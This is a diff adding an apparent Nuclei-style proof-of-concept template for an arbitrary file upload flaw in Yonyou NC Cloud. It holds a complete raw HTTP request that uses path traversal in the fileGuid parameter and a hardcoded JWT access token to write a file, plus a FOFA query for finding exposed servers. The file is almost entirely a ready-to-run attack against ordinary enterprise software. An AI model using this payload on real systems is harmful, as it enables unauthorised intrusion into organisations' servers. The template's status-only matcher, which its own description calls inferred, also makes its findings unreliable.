@@ -1,0 +1,46 @@
+id: poc-989d6f55a5a2d4460932
+info:
+  name: 用友NCclouduploadChunk存在任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/989d6f55a5a2d446093273a5558eea9f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 989d6f55a5a2d446093273a5558eea9f
+    fofa: + fofa`app="用友-NC-Cloud"`
+http:
+- raw:
+  - 'POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 175
+
+    Content-Type: multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9
+
+    accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    Accept-Encoding: gzip, deflate
+
+
+
+    --024ff46f71634a1c9bf8ec5820c26fa9
+
+    Content-Disposition: form-data; name="file"; filename=".Ivoz0.txt"
+
+
+    2WtGfBFl2S4GP9FkbK2x5Mg3Dci
+
+    --024ff46f71634a1c9bf8ec5820c26fa9--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
